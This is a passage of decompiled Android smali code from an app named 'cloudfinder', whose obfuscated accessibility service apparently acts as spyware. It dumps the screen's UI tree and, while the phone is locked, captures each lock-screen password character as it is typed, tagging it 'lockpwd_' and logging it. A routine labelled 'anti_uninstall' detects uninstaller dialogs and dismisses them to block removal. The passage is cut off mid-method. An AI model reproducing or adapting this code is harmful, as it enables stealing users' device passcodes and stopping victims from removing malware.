    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->bottom:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " visible=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " editable=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " multiline=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isMultiLine()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " dismissable=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isDismissable()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " childcount=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, ">"

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 p4, 0x0

    :goto_1
    if-ge p4, v3, :cond_5

    invoke-virtual {p1, p4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result v1

    if-eqz v1, :cond_3

    add-int/lit8 v7, p3, 0x1

    move-object v4, p0

    move-object v5, v0

    move-object v6, p2

    move v8, p4

    move-object v9, p5

    invoke-virtual/range {v4 .. v9}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ء(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/StringBuilder;IILandroid/graphics/Rect;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :cond_3
    :try_start_1
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_4
    add-int/lit8 p4, p4, 0x1

    goto :goto_1

    :cond_5
    :try_start_2
    const-string p1, "</node>"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_1
    move-exception p1

    const-string p2, "MyAccessSvc"

    const-string p3, "buildHtmlNode error"

    invoke-static {p2, p3, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_2
    return-void
.end method

.method public final آ(Landroid/view/accessibility/AccessibilityWindowInfo;Ljava/lang/StringBuilder;Landroid/graphics/Rect;)V
    .locals 5

    const-string v0, ","

    const-string v1, "\""

    :try_start_0
    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityWindowInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v2, p3}, Landroid/graphics/Rect;->intersect(Landroid/graphics/Rect;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityWindowInfo;->getLayer()I

    move-result p3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    const/4 p3, 0x0

    :goto_0
    :try_start_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityWindowInfo;->getTitle()Ljava/lang/CharSequence;

    move-result-object v3
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    const/4 v3, 0x0

    :goto_1
    if-eqz v3, :cond_0

    :try_start_3
    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_2

    :cond_0
    const-string v3, ""

    :goto_2
    const-string v4, "<node"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " index=\"0\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " depth=\"0\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " text=\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " clz=\"com.android.permissioncontroller.permission.ui.GrantPermissionsActivity\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " pkg=\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " desc=\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " id=\"\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " checkable=\"false\" checked=\"false\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " clickable=\"true\" enabled=\"true\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " focusable=\"true\" focused=\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityWindowInfo;->isFocused()Z

    move-result v4

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " scrollable=\"false\" long-clickable=\"false\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " password=\"false\" selected=\"false\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " bounds=\"["

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v2, Landroid/graphics/Rect;->left:I

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v2, Landroid/graphics/Rect;->top:I

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "]["

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v2, Landroid/graphics/Rect;->right:I

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v2, Landroid/graphics/Rect;->bottom:I

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, "]\""

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " left=\""

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v2, Landroid/graphics/Rect;->left:I

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " top=\""

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v2, Landroid/graphics/Rect;->top:I

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " right=\""

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v2, Landroid/graphics/Rect;->right:I

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " bottom=\""

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v2, Landroid/graphics/Rect;->bottom:I

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " visible=\"true\" editable=\"false\""

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " layer=\""

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " title=\""

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " childcount=\""

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityWindowInfo;->getChildCount()I

    move-result p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "/>"

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_3

    :catch_2
    move-exception p1

    const-string p2, "MyAccessSvc"

    const-string p3, "buildStubNode error"

    invoke-static {p2, p3, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_3
    return-void
.end method

.method public final أ(Ljava/lang/String;)V
    .locals 16

    :try_start_0
    const-string v0, "keyguard"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-object/from16 v1, p0

    :try_start_1
    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    if-eqz v0, :cond_f

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-nez v0, :cond_0

    goto/16 :goto_7

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-wide v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ػ:J

    sub-long v4, v2, v4

    const-wide/16 v6, 0xc8

    cmp-long v0, v4, v6

    if-gez v0, :cond_1

    return-void

    :cond_1
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_2

    return-void

    :cond_2
    const/4 v4, 0x0

    invoke-static {v0, v4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ي(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_3

    return-void

    :cond_3
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    if-eqz v5, :cond_f

    invoke-interface {v5}, Ljava/lang/CharSequence;->length()I

    move-result v6

    if-nez v6, :cond_4

    goto/16 :goto_7

    :cond_4
    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    sget-object v6, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->غ:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_5

    return-void

    :cond_5
    move v6, v4

    :goto_0
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v7

    const/4 v8, 0x1

    const/16 v9, 0x25c9

    const/16 v10, 0x2a

    const/16 v11, 0x25cf

    const/16 v12, 0x2022

    if-ge v6, v7, :cond_7

    invoke-virtual {v5, v6}, Ljava/lang/String;->charAt(I)C

    move-result v7

    if-eq v7, v12, :cond_6

    if-eq v7, v11, :cond_6

    if-eq v7, v9, :cond_6

    if-eq v7, v10, :cond_6

    move v6, v4

    goto :goto_1

    :cond_6
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    :cond_7
    move v6, v8

    :goto_1
    if-eqz v6, :cond_8

    sput-object v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->غ:Ljava/lang/String;

    sput-wide v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ػ:J

    return-void

    :cond_8
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    sub-int/2addr v6, v8

    invoke-virtual {v5, v6}, Ljava/lang/String;->charAt(I)C

    move-result v6

    if-eq v6, v12, :cond_e

    if-eq v6, v11, :cond_e

    if-ne v6, v10, :cond_9

    goto/16 :goto_6

    :cond_9
    move v7, v4

    :goto_2
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v13

    sub-int/2addr v13, v8

    if-ge v7, v13, :cond_b

    invoke-virtual {v5, v7}, Ljava/lang/String;->charAt(I)C

    move-result v13

    if-eq v13, v12, :cond_a

    if-eq v13, v11, :cond_a

    if-eq v13, v9, :cond_a

    if-eq v13, v10, :cond_a

    goto :goto_3

    :cond_a
    add-int/lit8 v7, v7, 0x1

    goto :goto_2

    :cond_b
    move v4, v8

    :goto_3
    if-nez v4, :cond_c

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v4

    if-le v4, v8, :cond_c

    sput-object v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->غ:Ljava/lang/String;

    sput-wide v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ػ:J

    return-void

    :cond_c
    invoke-static {v6}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v4

    sput-object v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->غ:Ljava/lang/String;

    sput-wide v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ػ:J

    invoke-static {v6}, Ljava/lang/Character;->isDigit(C)Z

    move-result v2

    xor-int/2addr v2, v8

    if-eqz v2, :cond_d

    const-string v2, "pwd2"

    goto :goto_4

    :cond_d
    const-string v2, "pwd"

    :goto_4
    :try_start_2
    new-instance v3, Landroid/graphics/Rect;

    invoke-direct {v3}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget v6, v3, Landroid/graphics/Rect;->left:I

    iget v7, v3, Landroid/graphics/Rect;->right:I

    add-int/2addr v6, v7

    div-int/lit8 v6, v6, 0x2

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v6, ","

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v6, v3, Landroid/graphics/Rect;->top:I

    iget v3, v3, Landroid/graphics/Rect;->bottom:I

    add-int/2addr v6, v3

    div-int/lit8 v6, v6, 0x2

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_5

    :catch_0
    const/4 v3, 0x0

    :goto_5
    move-object v15, v3

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "lockpwd_"

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {}, Lسۄھؤۏ۫/؋;->ذ()Ljava/lang/String;

    move-result-object v10

    const-string v12, ""

    move-object/from16 v11, p1

    move-object v13, v2

    move-object v14, v4

    invoke-static/range {v9 .. v15}, Lڜٟٱڀ/ت;->؋(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "LOCK_PWD_CH3 char="

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " type="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " field="

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "MyAccessSvc"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_e
    :goto_6
    sput-object v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->غ:Ljava/lang/String;

    sput-wide v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ػ:J

    goto :goto_7

    :catch_1
    move-object/from16 v1, p0

    :catch_2
    :cond_f
    :goto_7
    return-void
.end method

.method public final ؤ(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 14

    const-string v0, "BLOCKED|path=installer_dialog|pkg="

    const-string v1, "BLOCKED|path=app_detail|pkg="

    const/4 v2, 0x0

    if-nez p1, :cond_0

    return v2

    :cond_0
    invoke-virtual {p0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ـ()Z

    move-result v3

    if-nez v3, :cond_1

    return v2

    :cond_1
    sget-boolean v3, Lسۄھؤۏ۫/؋;->ر:Z

    if-nez v3, :cond_19

    sget-boolean v3, Lسۄھؤۏ۫/؋;->د:Z

    if-eqz v3, :cond_2

    goto/16 :goto_9

    :cond_2
    sget-boolean v3, Lسۄھؤۏ۫/؋;->ز:Z

    if-eqz v3, :cond_3

    return v2

    :cond_3
    sget-boolean v3, Lڃٷښـ۝ۼ/ؠ;->ئ:Z

    if-eqz v3, :cond_4

    return v2

    :cond_4
    sget-boolean v3, Lڗًقڔ/؋;->ئ:Z

    if-eqz v3, :cond_5

    return v2

    :cond_5
    sget-boolean v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-nez v3, :cond_6

    return v2

    :cond_6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    const/16 v4, 0x20

    if-eq v3, v4, :cond_7

    return v2

    :cond_7
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v3

    if-nez v3, :cond_8

    return v2

    :cond_8
    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د:Ljava/util/HashSet;

    invoke-virtual {v4, v3}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v4

    const/4 v5, 0x1

    if-nez v4, :cond_a

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const-string v6, "packageinstaller"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_9

    goto :goto_0

    :cond_9
    move v4, v2

    goto :goto_1

    :cond_a
    :goto_0
    move v4, v5

    :goto_1
    sget-object v6, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ذ:Ljava/util/HashSet;

    invoke-virtual {v6, v3}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v6

    if-nez v4, :cond_b

    if-nez v6, :cond_b

    iput-object v3, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ء:Ljava/lang/String;

    :cond_b
    if-eqz v4, :cond_c

    iget-object v7, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ء:Ljava/lang/String;

    invoke-virtual {p0, v7}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ق(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_c

    return v2

    :cond_c
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    move-result-object v7

    const-string v8, ""

    if-eqz v7, :cond_d

    invoke-interface {v7}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    goto :goto_2

    :cond_d
    move-object v7, v8

    :goto_2
    invoke-virtual {v7}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v9

    const-string v10, "|cls="

    const-string v11, "anti_uninstall"

    if-eqz v4, :cond_12

    const-string v12, "uninstaller"

    invoke-virtual {v9, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_11

    const-string v12, "uninstall"

    invoke-virtual {v9, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_11

    const-string v12, "deleteactivity"

    invoke-virtual {v9, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_e

    goto :goto_4

    :cond_e
    const-string v12, "alertdialog"

    invoke-virtual {v9, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_10

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v12

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    invoke-virtual {v12, v13}, Landroid/content/pm/PackageItemInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v12

    invoke-interface {v12}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p1

    if-nez p1, :cond_f

    goto :goto_3

    :cond_f
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v8

    :goto_3
    invoke-static {v8}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_10

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v11, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
